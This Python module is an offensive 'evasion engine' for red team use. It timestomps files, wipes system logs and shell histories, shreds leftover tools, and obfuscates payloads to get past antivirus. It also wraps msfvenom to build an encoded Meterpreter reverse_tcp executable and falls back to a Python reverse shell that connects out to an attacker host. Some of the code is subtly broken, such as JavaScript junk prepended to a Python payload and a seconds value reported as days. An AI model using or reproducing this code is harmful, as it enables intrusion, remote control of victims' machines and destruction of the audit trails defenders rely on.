"""
Evasion & Anti-Detection Module
Professional Red Team Evasion Techniques
"""

import os
import random
import string
import subprocess
import hashlib
import secrets
from datetime import datetime
from pathlib import Path
import json


class EvasionEngine:
    """Anti-Detection and Evasion Techniques for Red Team Operations"""
    
    def __init__(self):
        self.stats = {
            "total_evasion_attempts": 0,
            "successful_evasions": 0,
            "timestomp_count": 0,
            "log_clear_count": 0,
            "artifact_removal_count": 0,
            "av_bypass_attempts": 0,
            "success_rate": 0.0
        }
        self.technique_signatures = []
        
    def update_stats(self, category):
        """Update evasion statistics"""
        self.stats["total_evasion_attempts"] += 1
        if category in self.stats:
            self.stats[category] += 1
        
        # Calculate success rate
        if self.stats["total_evasion_attempts"] > 0:
            self.stats["success_rate"] = round(
                (self.stats["successful_evasions"] / self.stats["total_evasion_attempts"]) * 100, 2
            )
    
    def timestomp(self, file_path, reference_file=None):
        """
        Modify file timestamps to avoid forensic detection
        Anti-forensics: Timestomping
        """
        try:
            if not os.path.exists(file_path):
                return False, "File not found"
            
            if reference_file and os.path.exists(reference_file):
                # Copy timestamps from reference file
                result = subprocess.run(
                    ["touch", "-r", reference_file, file_path],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    self.update_stats("timestomp_count")
                    return True, f"Timestamps copied from {reference_file}"
            
            # Set to current time randomly offset
            offset = random.randint(-30, 30) * 86400  # ±30 days
            target_time = datetime.now().timestamp() + offset
            
            os.utime(file_path, (target_time, target_time))
            self.update_stats("timestomp_count")
            return True, f"Timestamp modified (offset: {offset} days)"
            
        except Exception as e:
            return False, f"Timestomp failed: {str(e)}"
    
    def clear_logs(self, targets=None):
        """
        Clear system logs and event traces
        """
        results = []
        targets = targets or self._get_default_log_targets()
        
        for target in targets:
            try:
                if os.path.exists(target):
                    # Method 1: Truncate file
                    with open(target, 'w') as f:
                        f.write("")
                    results.append(f"Cleared: {target}")
                    self.update_stats("log_clear_count")
                    
                elif os.path.isdir(target):
                    # Clear all files in directory
                    for f in Path(target).rglob("*"):
                        if f.is_file():
                            try:
                                with open(f, 'w') as fh:
                                    fh.write("")
                                results.append(f"Cleared: {str(f)}")
                                self.update_stats("log_clear_count")
                            except:
                                pass
                                
            except Exception as e:
                results.append(f"Failed {target}: {str(e)}")
        
        self.update_stats("successful_evasions")
        return results
    
    def _get_default_log_targets(self):
        """Get default log files to clear"""
        return [
            "/var/log/auth.log",
            "/var/log/syslog", 
            "/var/log/messages",
            "/var/log/secure",
            "/var/log/btmp",
            "/var/log/wtmp",
            "/var/log/lastlog",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/mysql/mysql.log",
            "/var/log/postgresql/postgresql.log",
            "/tmp/.bash_history",
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            "/root/.bash_history",
            "/var/log/sudo.log",
            "/var/log/kern.log"
        ]
    
    def remove_artifacts(self, artifacts):
        """
        Remove exploitation artifacts and tools
        """
        results = []
        
        for artifact in artifacts:
            try:
                if os.path.isfile(artifact):
                    # Overwrite with random data before deletion
                    size = os.path.getsize(artifact)
                    with open(artifact, 'wb') as f:
                        f.write(secrets.token_bytes(size))
                    os.remove(artifact)
                    results.append(f"Removed (shred): {artifact}")
                    self.update_stats("artifact_removal_count")
                    
                elif os.path.isdir(artifact):
                    import shutil
                    shutil.rmtree(artifact, ignore_errors=True)
                    results.append(f"Removed directory: {artifact}")
                    self.update_stats("artifact_removal_count")
                    
            except Exception as e:
                results.append(f"Failed remove {artifact}: {str(e)}")
        
        if results:
            self.update_stats("successful_evasions")
        
        return results
    
    def polymorphic_encoder(self, payload, iterations=3):
        """
        Generate polymorphic/encoded payload to bypass AV signature detection
        Multiple layers of encoding and obfuscation
        """
        self.update_stats("av_bypass_attempts")
        
        encoded = payload
        
        # Layer 1: Base64 encoding with random salt
        salt = secrets.token_hex(8)
        encoded = self._xor_encode(encoded, salt)
        encoded = self._base64_encode(encoded)
        encoded = f"SALT:{salt}:{encoded}"
        
        # Layer 2: Random variable substitution
        for _ in range(iterations):
            encoded = self._random_obfuscate(encoded)
        
        # Layer 3: Add junk code
        encoded = self._inject_junk_code(encoded)
        
        self.update_stats("successful_evasions")
        return encoded
    
    def _xor_encode(self, data, key):
        """XOR encryption with hex key"""
        result = []
        key_len = len(key)
        for i, char in enumerate(data):
            key_char = key[i % key_len]
            result.append(chr(ord(char) ^ ord(key_char)))
        return ''.join(result)
    
    def _base64_encode(self, data):
        """Base64 encoding"""
        import base64
        return base64.b64encode(data.encode()).decode()
    
    def _base64_decode(self, data):
        """Base64 decoding"""
        import base64
        return base64.b64decode(data.encode()).decode()
    
    def _random_obfuscate(self, code):
        """Add random obfuscation layers"""
        obfuscations = [
            self._add_hex_escape,
            self._add_octal_escape,
            self._add_string_concat,
            self._add_useless_operations
        ]
        
        # Apply 1-2 random obfuscations
        for _ in range(random.randint(1, 2)):
            obfuscation = random.choice(obfuscations)
            code = obfuscation(code)
        
        return code
    
    def _add_hex_escape(self, code):
        """Convert some characters to hex escape sequences"""
        result = []
        for char in code:
            if random.random() < 0.1 and char.isalnum():
                result.append(f"\\x{ord(char):02x}")
            else:
                result.append(char)
        return ''.join(result)
    
    def _add_octal_escape(self, code):
        """Convert some characters to octal escape sequences"""
        result = []
        for char in code:
            if random.random() < 0.08 and char.isalnum():
                result.append(f"\\{oct(ord(char))[2:]}")
            else:
                result.append(char)
        return ''.join(result)
    
    def _add_string_concat(self, code):
        """Break strings into concatenation"""
        if len(code) < 20:
            return code
            
        words = code.split()
        if len(words) > 1:
            random.shuffle(words)
            # Split long strings
            new_parts = []
            for word in words[:5]:
                if len(word) > 4:
                    mid = len(word) // 2
                    word = f'"{word[:mid]}"+"{word[mid:]}"'
                new_parts.append(word)
            code = ' + '.join(new_parts)
        return code
    
    def _add_useless_operations(self, code):
        """Add useless arithmetic operations that don't affect result"""
        useless_ops = [
            "0+0;",
            "1-1;", 
            "2*1-2;",
            "var x=0;x+=0;",
        ]
        junk = random.choice(useless_ops)
        return junk + code
    
    def _inject_junk_code(self, code):
        """Inject junk code that doesn't affect functionality"""
        junk = f"""
        // Junk code - anti-analysis
        (function(){{
            var a = {random.randint(1000,9999)};
            var b = a * {random.randint(2,10)};
            var c = b - a;
            if(c < 0) c = 0;
        }})();
        """
        return junk + code
    
    def msfvenom_wrapper(self, lhost, lport, payload_type="windows/meterpreter/reverse_tcp", 
                         format="exe", obfuscation_level="high"):
        """
        Wrapper for msfvenom with automatic obfuscation
        """
        self.update_stats("av_bypass_attempts")
        
        try:
            # Build msfvenom command
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "--encrypt", "xor",
                "-o", f"/tmp/payload_{secrets.token_hex(4)}.exe"
            ]
            
            if obfuscation_level == "high":
                cmd.extend(["--encrypt", "xor", "-e", "x86/shikata_ga_nai", "-i", "5"])
            
            # Run msfvenom
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.update_stats("successful_evasions")
                return {
                    "success": True,
                    "output": result.stdout,
                    "command": ' '.join(cmd)
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        except FileNotFoundError:
            # Fallback: generate manual obfuscated payload
            return self._generate_fallback_payload(lhost, lport)
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _generate_fallback_payload(self, lhost, lport):
        """Generate fallback reverse shell if msfvenom not available"""
        import base64
        
        # Simple reverse shell (encoded)
        shellcode = f'''
        import socket,subprocess,os;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("{lhost}",{lport}));
        os.dup2(s.fileno(),0);
        os.dup2(s.fileno(),1);
        os.dup2(s.fileno(),2);
        import pty;
        pty.spawn("/bin/bash");
        '''
        
        # Encode with polymorphism
        encoded = self.polymorphic_encoder(shellcode, iterations=3)
        
        self.update_stats("successful_evasions")
        return {
            "success": True,
            "output": "Generated polymorphic payload",
            "payload": encoded,
            "note": "msfvenom not available - using Python fallback"
        }
    
    def session_cleanup(self, session_id):
        """
        Perform complete session cleanup after operation
        """
        results = {
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "actions": []
        }
        
        # Clear logs
        log_results = self.clear_logs()
        results["actions"].extend([{"action": "log_clear", "results": log_results}])
        
        # Remove common artifacts
        artifacts = [
            f"/tmp/msf_{session_id}.exe",
            f"/tmp/shell_{session_id}.sh",
            f"/tmp/payload_{session_id}",
            "/tmp/msf4",
            "/tmp/.msf4"
        ]
        removal_results = self.remove_artifacts(artifacts)
        results["actions"].extend([{"action": "artifact_removal", "results": removal_results}])
        
        # Update success metrics
        self.update_stats("successful_evasions")
        
        return results
    
    def get_stats(self):
        """Get evasion statistics"""
        return self.stats
    
    def generate_report(self):
        """Generate evasion operations report"""
        return {
            "report_date": datetime.now().isoformat(),
            "statistics": self.stats,
            "success_rate": f"{self.stats['success_rate']}%",
            "recommendations": self._get_recommendations()
        }
    
    def _get_recommendations(self):
        """Get evasion improvement recommendations"""
        rate = self.stats["success_rate"]
        
        if rate >= 95:
            return ["Excellent evasion success rate!", "Consider testing against newer EDR solutions"]
        elif rate >= 80:
            return ["Good success rate", "Add more obfuscation layers", "Test with updated AV signatures"]
        elif rate >= 60:
            return ["Moderate success rate", "Increase polymorphism iterations", "Add process hollowing techniques"]
        else:
            return ["Low success rate", "Implement process injection", "Use indirect syscalls", "Consider alternative C2 frameworks"]


# Singleton instance
evasion_engine = EvasionEngine()
